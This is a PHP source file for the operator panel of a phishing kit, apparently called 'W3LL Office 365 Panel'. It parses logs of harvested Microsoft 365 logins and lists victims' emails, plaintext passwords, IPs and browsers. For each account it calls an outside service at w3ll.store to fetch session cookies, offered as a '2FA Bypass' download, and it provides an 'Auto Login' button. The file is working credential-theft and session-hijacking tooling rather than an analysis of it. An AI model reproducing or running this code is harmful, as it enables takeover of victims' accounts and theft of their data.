<?php

error_reporting(E_ALL);
session_start();
require "../gogo/conf.php";
if (!isset($_SESSION["login"])) {
    header("Location: login");
    die;
}
if (isset($_POST["clear"])) {
    file_put_contents("../gogo/" . $visitorfileName, '');
    file_put_contents("../gogo/error_" . $logsfileName, '');
    file_put_contents("../gogo/" . $logsfileName, '');
}
function Checkpassword($email, $password)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://w3ll.store/api/office-val?email=" . $email . "&pass=" . $password);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
    curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate");
    $result = curl_exec($ch);
    if (curl_errno($ch)) {
        echo "Error:" . curl_error($ch);
    }
    $result = json_decode($result, true);
    curl_close($ch);
    return $result["result"];
}
if (isset($_POST["password"])) {
    $_POST["email"] = urlencode($_POST["email"]);
    $_POST["password"] = urlencode($_POST["password"]);
    $_POST["email"] = str_replace("%0D%0A", '', $_POST["email"]);
    $_POST["password"] = str_replace("%0D%0A", '', $_POST["password"]);
    //$result = Checkpassword($_POST["email"], $_POST["password"]);
    $result = true;
    if ($result == '') {
        echo "Error when logged in.";
        die;
    }
    $result = html_entity_decode($result);
    echo $result;
    die;
} else {
    if (isset($_POST["email"])) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://w3ll.store/api/office/office-2fa?email=" . $_POST["email"]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
        curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate");
        $result = curl_exec($ch);
        if (curl_errno($ch)) {
            echo "Error:" . curl_error($ch);
        }
        curl_close($ch);
        $result = json_decode($result, true);
        $result = $result["cookie"];
        $filename = "cookie.txt";
        header("Content-Type: text/plain");
        header("Content-Disposition: attachment; filename=\"cookie.txt\"");
        header("Content-Length: " . strlen($result));
        echo $result;
        die;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <title>W3LL OFFICE 365 PANEL
    </title>
    <meta charset="utf-8">
    <meta content="width=device-width,initial-scale=1"name="viewport">
    <link href="style.css"rel="stylesheet">
    <link href="https://w3ll.shop/images/logonew.png"rel="icon"type="image/x-icon">
    <link href="//cdn.datatables.net/1.10.19/css/jquery.dataTables.min.css"rel="stylesheet">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js">
    </script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js">
    </script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js">
    </script>
    <script src="//cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js">
    </script>
    <style type="text/css">.row{
      margin-top:30px}
    </style>
  </head>
  <body>
    <nav class="bg-dark navbar navbar-dark navbar-expand-md">
      <a class="navbar-brand"href="https://w3ll.store">
        <img height="35"src="https://w3ll.shop/images/logonew.png"width="35"> W3LL PANEL
      </a> 
      <button class="navbar-toggler"type="button"data-target="#collapsibleNavbar"data-toggle="collapse">
        <span class="navbar-toggler-icon">
        </span>
      </button>
      <div class="collapse navbar-collapse"id="collapsibleNavbar">
        <ul class="ml-auto navbar-nav">
          <li class="nav-item">
            <a class="nav-link"href="logout">
              <img height="35"src="https://www.svgrepo.com/show/207562/logout.svg"width="35">
            </a>
          </li>
        </ul>
      </div>
    </nav>
    <div class="container">
      <div class="row">
        <div class="col-xs-12 col-lg-12 col-md-12">
          <button class="btn btn-block btn-danger"type="button"id="clear">Clear All Statistic & History
          </button>
        </div>
      </div>
      <div class="row">
        <div class="col-xs-12 col-lg-4 col-md-4">
          <div class="card">
            <div class="card-header text-center">Total Visit
            </div>
            <div class="card-body text-center">
              <h3>
                <?php 
$get = file_get_contents("../gogo/" . $visitorfileName);
echo substr_count($get, "IP Address");
?>
              </h3>
            </div>
          </div>
        </div>
        <div class="col-xs-12 col-lg-4 col-md-4">
          <div class="card">
            <div class="card-header text-center">Valid Login
            </div>
            <div class="card-body text-center">
              <h3>
                <?php 
$get = file_get_contents("../gogo/" . $logsfileName);
echo substr_count($get, "VALID LOGS");
?>
              </h3>
            </div>
          </div>
        </div>
        <div class="col-xs-12 col-lg-4 col-md-4">
          <div class="card">
            <div class="card-header text-center">Invalid Login
            </div>
            <div class="card-body text-center">
              <h3>
                <?php 
$get = file_get_contents("../gogo/error_" . $logsfileName);
echo substr_count($get, "INVALID LOGS");
?>
              </h3>
            </div>
          </div>
        </div>
      </div>
      <?php 
$logsnya = file_get_contents("../gogo/" . $logsfileName);
$mails = preg_match_all("/Email : (.+)/", $logsnya, $mail);
$passs = preg_match_all("/Password : (.+)/", $logsnya, $pass);
$agents = preg_match_all("/Browser: (.+)/", $logsnya, $agent);
$ipss = preg_match_all("/IP : (.+)/", $logsnya, $ips);
$total = count($mail[1]);
?>
      <div class="row">
        <div class="col-xs-12 col-lg-12 col-md-12">
          <div class="card">
            <div class="card-header">Valid Account
            </div>
            <div class="card-body">
              <table class="table">
                <thead>
                  <tr>
                    <th>Email
                    </th>
                    <th>Password
                    </th>
                    <th>User Agent
                    </th>
                    <th>IP
                    </th>
                    <th>Auto Login
                    </th>
                    <th>2FA Bypass
                    </th>
                  </tr>
                </thead>
                <tbody>
                  <?php 
for ($i = 0; $i < $total; $i++) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://w3ll.store/api/office/office-2fa?email=" . $mail[1][$i]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate");
$result = curl_exec($ch);
if (curl_errno($ch)) {
echo "Error:" . curl_error($ch);
}
curl_close($ch);
$result = json_decode($result, true);
echo "<tr>";
echo "<td>" . $mail[1][$i] . "</td>";
echo "<td>" . $pass[1][$i] . "</td>";
echo "<td>" . $agent[1][$i] . "</td>";
echo "<td>" . $ips[1][$i] . "</td>";
if (!$result["valid"]) {
echo "<td><form method=\"POST\"><input type=\"hidden\" name=\"password\" value=\"" . $pass[1][$i] . "\"><input type=\"hidden\" name=\"email\" value=\"" . $mail[1][$i] . "\"><input type=\"submit\" name=\"submit\" class=\"btn btn-success btn-sm\" value=\"Auto Login\" id=\"logon\"></form></td>";
echo "<td>None</td>";
} else {
echo "<td>None</td>";
echo "<td><form method=\"POST\"><input type=\"hidden\" name=\"email\" value=\"" . $mail[1][$i] . "\"><input type=\"submit\" name=\"submit\" class=\"btn btn-success btn-sm\" value=\"Get Cookies\" id=\"logon\"></form></td>";
}
echo "</tr>";
}
?>
                </tbody>
              </table>
            </div>
          </div>
        </div>
      </div>
      <?php 
$logsnya = file_get_contents("../gogo/error_" . $logsfileName);
$mails = preg_match_all("/Email : (.+)/", $logsnya, $mail);
$passs = preg_match_all("/Password : (.+)/", $logsnya, $pass);
$agents = preg_match_all("/Browser: (.+)/", $logsnya, $agent);
$ipss = preg_match_all("/IP : (.+)/", $logsnya, $ips);
$total = count($mail[1]);
?>
      <div class="row">
        <div class="col-xs-12 col-lg-12 col-md-12">
          <div class="card">
            <div class="card-header">Invalid Account
            </div>
            <div class="card-body">
              <table class="table">
                <thead>
                  <tr>
                    <th>Email
                    </th>
                    <th>Password
                    </th>
                    <th>User Agent
                    </th>
                    <th>IP
                    </th>
                  </tr>
                </thead>
                <tbody>
                  <?php 
for ($i = 0; $i < $total; $i++) {
echo "<tr>";
echo "<td>" . $mail[1][$i] . "</td>";
echo "<td>" . $pass[1][$i] . "</td>";
echo "<td>" . $agent[1][$i] . "</td>";
echo "<td>" . $ips[1][$i] . "</td>";
echo "</tr>";
}
?>
                </tbody>
              </table>
            </div>
          </div>
        </div>
      </div>
      <?php 
$logsnya = file_get_contents("../gogo/" . $visitorfileName);
$ipaddresss = preg_match_all("/IP Address: (.+)/", $logsnya, $ipaddress);
$browsers = preg_match_all("/Browser: (.+)/", $logsnya, $browser);
$dates = preg_match_all("/Date: (.+)/", $logsnya, $date);
$total = count($ipaddress[1]);
?>
      <div class="row">
        <div class="col-xs-12 col-lg-12 col-md-12">
          <div class="card">
            <div class="card-header">All visit
            </div>
            <div class="card-body">
              <table class="table">
                <thead>
                  <tr>
                    <th>IP Address
                    </th>
                    <th>User agent
                    </th>
                    <th>Date
                    </th>
                  </tr>
                </thead>
                <tbody>
                  <?php 
for ($i = 0; $i < $total; $i++) {
echo "<tr>";
echo "<td>" . $ipaddress[1][$i] . "</td>";
echo "<td>" . $browser[1][$i] . "</td>";
echo "<td>" . $date[1][$i] . "</td>";
echo "</tr>";
}
?>
                </tbody>
              </table>
            </div>
          </div>
        </div>
      </div>
    </div>
    <script>function myFunction(){
        var e=document.getElementById("myInput");
        e.select(),e.setSelectionRange(0,99999),navigator.clipboard.writeText(e.value)}
      $(function(){
        $("table").DataTable({
          order:[[0,"desc"]]}
                            ),$(document).on("click","#clear",function(){
          $.post("index",{
            clear:!0}
                 ,function(e){
            setTimeout(function(){
              window.location.reload()}
                       ,500)}
                )}
                                            )}
       )</script>
  </body>
</html>

